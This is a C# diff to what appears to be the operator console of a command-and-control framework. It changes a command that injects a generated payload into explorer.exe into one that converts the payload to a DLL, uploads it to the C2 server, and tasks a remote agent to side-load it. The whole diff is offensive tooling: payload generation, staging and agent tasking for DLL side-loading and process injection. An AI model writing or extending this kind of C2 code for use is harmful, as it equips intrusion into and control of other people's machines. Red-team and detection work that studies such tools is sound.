@@ -13,7 +13,7 @@ using System.Threading.Tasks;
 namespace Commander
 {
 
-    public abstract class InjectCommand : ExecutorCommand
+    public abstract class SiteLoadCommand : ExecutorCommand
     {
         public const int ChunkSize = 10000;
 
@@ -34,18 +34,24 @@ namespace Commander
             terminal.WriteLine($"Generating payload with params {parms}...");
             terminal.WriteLine(this.GenerateBin(this.ExeName, this.ComputeParams(parms), out var binFileName));
 
-
-            terminal.WriteLine($"Pushing {binFileName} to the server...");
-            //var binFileName = "e:\\Share\\tmp\\C2\\Custom\\b18a05ad-b7df-4fcf-b529-d6faa582ed13.bin";
-            string serverFile = ServerFolder + "/" + Path.GetFileName(binFileName);
-            terminal.WriteLine($"ServerFile = {serverFile}...");
-            if (!this.PushFile(binFileName, serverFile, terminal, executor, comm).Result)
-                terminal.WriteError("An error occured while uploading the file to the server");
+            terminal.WriteLine($"Generating dll from bin...");
+            terminal.WriteLine(this.GenerateDllFromBin(binFileName, out var exeFileName));
 
             File.Delete(binFileName);
 
+
+
+            terminal.WriteLine($"Pushing {exeFileName} to the server...");
+            //var binFileName = "e:\\Share\\tmp\\C2\\Custom\\b18a05ad-b7df-4fcf-b529-d6faa582ed13.bin";
+            string serverFile = ServerFolder + "/" + Path.GetFileName(exeFileName);
+            terminal.WriteLine($"ServerFile = {serverFile}...");
+            if (!this.PushFile(exeFileName, serverFile, terminal, executor, comm).Result)
+                terminal.WriteError("An error occured while uploading the file to the server");
+
+            File.Delete(exeFileName);
+
             var agent = executor.CurrentAgent;
-            var response = comm.TaskAgent(agent.Metadata.Id, "inject-spawn", $"{serverFile} explorer.exe").Result;
+            var response = comm.TaskAgent(agent.Metadata.Id, "side-load", $"{serverFile}").Result;
             if (!response.IsSuccessStatusCode)
             {
                 terminal.WriteError("An error occured : " + response.StatusCode);
@@ -69,6 +75,16 @@ namespace Commander
             binPath = name;
             return ret;
         }
+
+        protected string GenerateDllFromBin(string binpath, out string dllPath)
+        {
+            var filenamewo = Path.GetFileNameWithoutExtension(binpath);
+            var name = Path.Combine(TmpFolder, filenamewo + ".dll");
+            string ret = Internal.BinMaker.GenerateDll(binpath, name);
+            dllPath = name;
+            return ret;
+        }
+
 
         protected async Task<bool> PushFile(string fileName, string remoteName, ITerminal terminal, IExecutor executor, ICommModule comm)
         {
